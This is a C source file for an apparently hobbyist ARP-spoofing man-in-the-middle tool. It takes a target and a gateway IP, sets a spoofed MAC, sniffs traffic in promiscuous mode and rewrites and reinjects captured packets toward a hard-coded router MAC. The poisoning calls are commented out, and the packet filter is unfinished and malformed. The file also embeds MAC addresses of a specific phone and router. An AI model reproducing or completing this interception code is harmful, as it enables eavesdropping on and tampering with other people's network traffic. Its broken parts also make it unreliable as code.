

#include <stdio.h>
#include "packetStructures.h"
#include "pcap.h"
#include "arp.h"
#include "tcp.h"
#include "pcapSettings.h"

// android mac: f0:27:65:ff:de:43
/*
15:31:23.677800 ARP, Reply pp is-at 0d:0e:0a:0d:00:00 (oui Unknown), length 28
 */
//router mac: e0:3f:49:9c:67:58
uint8_t gatewayHwAddr[] = {0xe0, 0x3f, 0x49, 0x9c, 0x67, 0x58};

int swapHwAddr(struct ethernet_h* eth, uint8_t* replaceAddr){
    if (eth==(struct ethernet_h*)0 || replaceAddr == (uint8_t*)0){
        printf("NULL arg given to swapHwAddr\n");
        exit(1);
    }
    memmove(eth->ether_dhost, replaceAddr, 6);
    return 0;
}

void printHwAddr(uint8_t* hw){
    printf("0x");
    for (int i=0; i<6; i++)
        printf("%x",hw[i]);
    printf("\n");
}

int logTcp(char* ip, uint8_t* hwAddr){
    char filter[160];
    // TODO finish this
    sprintf(filter, "(ether[6:4] == 0x%x%x%x%x && ether[10:2] == 0x%x%x)"
                    "||(ether[])", 
        hwAddr[0], hwAddr[1], hwAddr[2], hwAddr[3], hwAddr[4], hwAddr[5]);
    printf("tcp filter: %s\n",filter);

    pcap_t* handle = setPromiscuous(Settings.dev, filter);
    struct pcap_pkthdr header;  /* The header that pcap gives us */
    struct ethernet_h* ethPacket;
    struct ip4_h* ipPacket;
    const u_char *packet;       /* The actual packet */
    while(1){
        packet = pcap_next(handle, &header);
        if (header.len <= 0)
            continue;
        printf("got packet of len %d \n    (", header.len);
        if (header.len < ETHER_H_SIZE)
            continue;
        ethPacket = (struct ethernet_h*)packet;
        switch(ntohs(ethPacket->type)){
            case 0x0800:    // IPv4
                printf("IPv4");
                if (header.len<=ETHER_H_SIZE+IP4_H_SIZE){
                    printf("(%d <= %d)", header.len, ETHER_H_SIZE+IP4_H_SIZE);
                    break;
                }
                ipPacket = (struct ip4_h*)(packet+ETHER_H_SIZE);
                switch(ipPacket->protocol){
                    case 0x6:
                        printf(" TCP");
                    break;
                    case 0x1:
                        printf(" ICMP");
                    break;
                    case 0x11:
                        printf(" UDP");
                    break;
                    default:
                        printf(" other");
                    
                }
            break;
            case 0x86DD:    // IPv6
                printf("IPv6");
            break;
            case 0x0806:    // ARP
                printf("ARP");
            break;
            case 0x6003:    // DECnet
                printf("DECnet");
            break;
            case 0x8035:    // ReverseARP
                printf("ReverseARP");
            break;
            default:
                printf("other 0x%x", ethPacket->type);
        }
        
        printf(")\n");
        //printf("Swapping: ");
        //printHwAddr(ethPacket->ether_dhost);
        swapHwAddr(ethPacket, gatewayHwAddr);
        //printf("Swapped: ");
        //printHwAddr(ethPacket->ether_dhost);
        int r = pcap_inject(handle, packet, header.len);
        //sendEth(gatewayHwAddr, ethPacket->ether_shost, 
        //        ntohs(ethPacket->type), packet+ETHER_H_SIZE, 
         //       header.len-ETHER_H_SIZE);
        //(void) pcap_next(handle, &header);
        printf("logged a packet of length %d\n", header.len);
        memset(&header,0, sizeof(struct pcap_pkthdr)); 

    }
    printf("done listening for tcp\n");
    return 0;
}
int main(int argc, char* argv[]){
    if (argc<4){
        printf("usage: ./a.out <interface> <iptarget> <ipgateway>\n");
        return 1;
    }
    Settings.dev = argv[1];
    Settings.arpMachine = libnet_init(
                                LIBNET_LINK_ADV, /* injection type */
                                Settings.dev,    /* network interface */
                                ERRBUF);         /* errbuf */
    Settings.ethMachine = libnet_init(
                                LIBNET_LINK_ADV, /* injection type */
                                Settings.dev,    /* network interface */
                                ERRBUF);         /* errbuf */
    Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
    Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
    uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe,0x0};
    uint8_t targetHwAddr[6];
    Settings.spoofedHwAddr = hwspoof;
    if (Settings.arpMachine == NULL){
        fprintf(stderr, "fail:%s\n", ERRBUF);
        exit(EXIT_FAILURE);
    }
    int ec;
    printf("poisoning %s\n", argv[3]);
    //ec = arpPoison(argv[3], argv[2], targetHwAddr);
    //if (ec)
    //    goto done;
    //printf("poisoning %s\n", argv[2]);
    //ec = arpPoison(argv[2], argv[3], targetHwAddr);
    //if (ec)
    //    goto done;
    logTcp(argv[2], targetHwAddr);
    done:
    libnet_destroy(Settings.arpMachine);
    return 0;
}
